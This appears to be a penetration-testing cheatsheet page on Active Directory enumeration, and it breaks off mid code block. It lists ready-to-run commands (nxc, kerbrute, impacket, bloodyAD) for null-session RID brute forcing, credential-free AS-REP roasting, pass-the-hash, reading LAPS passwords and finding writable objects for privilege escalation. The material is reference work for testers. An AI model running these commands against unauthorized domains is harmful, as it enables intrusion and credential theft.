@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Enumeration | JinPwn</title><meta name="description" content="AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/">
+<meta property="og:title" content="Enumeration | JinPwn">
+<meta property="og:description" content="AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Enumeration | JinPwn">
+<meta name="twitter:description" content="AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"AD enum, pre-auth and post-auth. LDAP filter-level work is in LDAP . Local Windows host enum is in Local Enum .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"Enumeration | JinPwn","url":"https://jinpwn.dev/cheatsheets/active-directory/ad01-enumeration/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Active Directory Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/active-directory/" class="cheatsheet-sidebar-section">Active Directory Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-sidebar-link">AD MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-sidebar-link is-current">Enumeration</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-sidebar-link">BloodHound</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-sidebar-link">Kerberoasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-sidebar-link">AS-REP Roasting</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-sidebar-link">Password Spraying</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-sidebar-link">LLMNR &amp; NTLM Relay</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-sidebar-link">ACL Abuse</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-sidebar-link">Delegation</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-sidebar-link">ADCS ESC1-16</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-sidebar-link">Credential Dumping</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-sidebar-link">DCSync</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-sidebar-link">Trust Attacks</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-sidebar-link">Persistence</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>Enumeration</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">Enumeration</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Active Directory Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/active-directory/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/00-ad-moc/" class="cheatsheet-mobile-sections-link">AD MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad01-enumeration/" class="cheatsheet-mobile-sections-link is-current">Enumeration</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad02-bloodhound/" class="cheatsheet-mobile-sections-link">BloodHound</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad03-kerberoasting/" class="cheatsheet-mobile-sections-link">Kerberoasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad04-as-rep-roasting/" class="cheatsheet-mobile-sections-link">AS-REP Roasting</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad05-password-spraying/" class="cheatsheet-mobile-sections-link">Password Spraying</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad06-llmnr--ntlm-relay/" class="cheatsheet-mobile-sections-link">LLMNR &amp; NTLM Relay</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad07-acl-abuse/" class="cheatsheet-mobile-sections-link">ACL Abuse</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad08-delegation/" class="cheatsheet-mobile-sections-link">Delegation</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad09-adcs-esc1-16/" class="cheatsheet-mobile-sections-link">ADCS ESC1-16</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad10-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad11-credential-dumping/" class="cheatsheet-mobile-sections-link">Credential Dumping</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad12-dcsync/" class="cheatsheet-mobile-sections-link">DCSync</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad13-trust-attacks/" class="cheatsheet-mobile-sections-link">Trust Attacks</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/active-directory/ad14-persistence/" class="cheatsheet-mobile-sections-link">Persistence</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>AD enum, pre-auth and post-auth. LDAP filter-level work is in <a href="https://jinpwn.dev/cheatsheets/misc/ldap/">LDAP</a>
+. Local Windows host enum is in <a href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">Local Enum</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">DC</span><span class="o">=</span>10.10.11.50
+</span></span><span class="line"><span class="cl"><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span></span><span class="line"><span class="cl"><span class="nv">BASE</span><span class="o">=</span><span class="s1">&#39;DC=corp,DC=local&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">USER</span><span class="o">=</span><span class="s1">&#39;svc_user&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">NTHASH</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span></span></code></pre></div><h2 id="0-pre-flight-hosts-file-and-krb5-config" data-heading-permalink="true"><span class="heading-content">0. Pre-flight: hosts file and krb5 config</span>
+    <a class="heading-permalink" href="#0-pre-flight-hosts-file-and-krb5-config" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Do this once per engagement before any other AD work. Kerberos and SPN-based tools all expect FQDN resolution.</p>
+<p>Generate <code>/etc/hosts</code> entries from the DC&rsquo;s LDAP info:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> --generate-hosts-file h <span class="o">&amp;&amp;</span> sudo tee -a /etc/hosts &lt; h <span class="o">&amp;&amp;</span> rm h
+</span></span></code></pre></div><p>This pulls hostname, FQDN, and IPs from the SMB banner and writes them in <code>/etc/hosts</code> format. Run it for every new DC or important host you discover. Verify:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">grep <span class="nv">$DOMAIN</span> /etc/hosts
+</span></span></code></pre></div><p>Generate a krb5 config:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> --generate-krb5-file krb5.<span class="nv">$DOMAIN</span>.conf
+</span></span></code></pre></div><p>Use the env var so you never touch the global <code>/etc/krb5.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">KRB5_CONFIG</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/krb5.<span class="nv">$DOMAIN</span>.conf
+</span></span><span class="line"><span class="cl"><span class="c1">## Verify it&#39;s picked up:</span>
+</span></span><span class="line"><span class="cl">klist -V 2&gt;/dev/null<span class="p">;</span> env <span class="p">|</span> grep KRB5
+</span></span></code></pre></div><p>Now Kerberos auth works from any tool without polluting the system config. Multi-domain engagements: keep a <code>krb5.$DOMAIN.conf</code> per realm, switch via <code>export KRB5_CONFIG=...</code>.</p>
+<h2 id="i-pre-auth-what-you-can-get-with-nothing" data-heading-permalink="true"><span class="heading-content">i. Pre-auth: what you can get with nothing</span>
+    <a class="heading-permalink" href="#i-pre-auth-what-you-can-get-with-nothing" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Anonymous SMB and LDAP, RID brute, Kerberos user enum, ASREP-roast without creds.</p>
+<p>Hostname, domain, OS, signing status, all from a single nxc call:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span>                                    <span class="c1">## also shows LDAP signing + channel binding</span>
+</span></span></code></pre></div><p>Anonymous SMB share list:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> --shares -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">smbclient -L <span class="s2">&#34;//</span><span class="nv">$DC</span><span class="s2">&#34;</span> -N
+</span></span></code></pre></div><p>Null-session RID brute (works on legacy):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb <span class="nv">$DC</span> --rid-brute <span class="m">10000</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">impacket-lookupsid <span class="s1">&#39;anonymous&#39;</span>@<span class="nv">$DC</span> -no-pass
+</span></span></code></pre></div><p>Anonymous LDAP bind:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldapsearch -x -H ldap://<span class="nv">$DC</span> -s base namingcontexts
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --users
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="s1">&#39;&#39;</span> -p <span class="s1">&#39;&#39;</span> --asreproast asrep-anon.txt    <span class="c1">## works on no-preauth users without creds</span>
+</span></span></code></pre></div><p>Kerberos user enum (no creds, just a user list):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">kerbrute userenum -d <span class="nv">$DOMAIN</span> --dc <span class="nv">$DC</span> /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -o users.valid
+</span></span></code></pre></div><h2 id="ii-with-creds-the-full-nxc-sweep" data-heading-permalink="true"><span class="heading-content">ii. With creds: the full nxc sweep</span>
+    <a class="heading-permalink" href="#ii-with-creds-the-full-nxc-sweep" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --users
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --groups
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --computers
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --pass-pol
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --admin-count
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --get-sid
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --dc-list
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --trusted-for-delegation
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --password-not-required
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --get-desc-users
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --find-delegation
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --gmsa
+</span></span></code></pre></div><p>PtH variant, no password needed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -H <span class="nv">$NTHASH</span> --users
+</span></span></code></pre></div><p>Common modules that come back enabled by default in modern nxc:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M maq                 <span class="c1">## machine account quota</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M get-network         <span class="c1">## subnets and sites</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M laps                <span class="c1">## read LAPS where allowed</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M adcs                <span class="c1">## ADCS templates</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M user-desc           <span class="c1">## pull all user descriptions</span>
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M enum_trusts
+</span></span><span class="line"><span class="cl">nxc ldap <span class="nv">$DC</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M ldap-checker        <span class="c1">## LDAP signing + channel binding</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-tip">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">Authentication formats nxc supports</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p><code>-p 'pass'</code>, <code>-H NTLM</code>, <code>--aesKey AES256KEY</code> for Kerberos, <code>--use-kcache</code> to use ccache from <code>KRB5CCNAME</code>. PtT works on every protocol.</p>
+  </div>
+</div>
+<h2 id="iii-bloodyad-enum-the-ldap-native-way" data-heading-permalink="true"><span class="heading-content">iii. bloodyAD enum, the LDAP-native way</span>
+    <a class="heading-permalink" href="#iii-bloodyad-enum-the-ldap-native-way" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>bloodyAD is the cleanest LDAP enum tool because every command maps to a single LDAP operation. Useful when nxc is loud or you want surgical reads.</p>
+<p>Global flags reminder:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> &lt;subcommand&gt;
+</span></span><span class="line"><span class="cl"><span class="c1">## PtH:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="s2">&#34;:</span><span class="nv">$NTHASH</span><span class="s2">&#34;</span> --host <span class="nv">$DC</span> &lt;subcommand&gt;
+</span></span><span class="line"><span class="cl"><span class="c1">## Kerberos:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -k --host <span class="nv">$DC</span> &lt;subcommand&gt;
+</span></span></code></pre></div><p>Get any object&rsquo;s attributes (whole object, or specific attrs):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object Administrator
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object Administrator --attr memberOf,userAccountControl
+</span></span><span class="line"><span class="cl"><span class="c1">## Domain-level info (password policy, behaviour version):</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object <span class="s2">&#34;</span><span class="nv">$BASE</span><span class="s2">&#34;</span> --attr minPwdLength,lockoutThreshold,lockOutObservationWindow,lockoutDuration,msDS-Behavior-Version
+</span></span><span class="line"><span class="cl"><span class="c1">## RootDSE (empty target):</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get object <span class="s2">&#34;&#34;</span>
+</span></span></code></pre></div><p>Search with LDAP filter, returns specific attrs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search --filter <span class="s1">&#39;(objectClass=user)&#39;</span> --attr samaccountname,description
+</span></span><span class="line"><span class="cl"><span class="c1">## Kerberoastable accounts:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search --filter <span class="s1">&#39;(&amp;(objectClass=user)(servicePrincipalName=*))&#39;</span> --attr samaccountname,servicePrincipalName
+</span></span><span class="line"><span class="cl"><span class="c1">## AS-REP roastable:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search --filter <span class="s1">&#39;(userAccountControl:1.2.840.113556.1.4.803:=4194304)&#39;</span> --attr samaccountname
+</span></span><span class="line"><span class="cl"><span class="c1">## Unconstrained delegation:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search --filter <span class="s1">&#39;(userAccountControl:1.2.840.113556.1.4.803:=524288)&#39;</span> --attr samaccountname,dNSHostName
+</span></span><span class="line"><span class="cl"><span class="c1">## Constrained delegation:</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get search --filter <span class="s1">&#39;(msDS-AllowedToDelegateTo=*)&#39;</span> --attr samaccountname,msDS-AllowedToDelegateTo
+</span></span></code></pre></div><p>Group membership (recursive by default):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get membership <span class="nv">$USER</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get membership Administrator --no-recurse
+</span></span></code></pre></div><p>DNS dump, every DNS record readable by the user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get dnsDump
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get dnsDump --zone <span class="nv">$DOMAIN</span>
+</span></span></code></pre></div><p>Trust enum as a tree:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get trusts
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get trusts --transitive
+</span></span></code></pre></div><p>Children of an OU/container, useful for finding stuck-away service accounts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get children --target <span class="s2">&#34;OU=Servers,</span><span class="nv">$BASE</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get children --otype user
+</span></span></code></pre></div><h2 id="iv-the-killer-feature-get-writable" data-heading-permalink="true"><span class="heading-content">iv. The killer feature: get writable</span>
+    <a class="heading-permalink" href="#iv-the-killer-feature-get-writable" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>What can YOU modify? This is the shortcut to every ACL-based privesc path. Run it early.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get writable
+</span></span><span class="line"><span class="cl">bloodyAD -d <span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> --host <span class="nv">$DC</span> get writable --detail
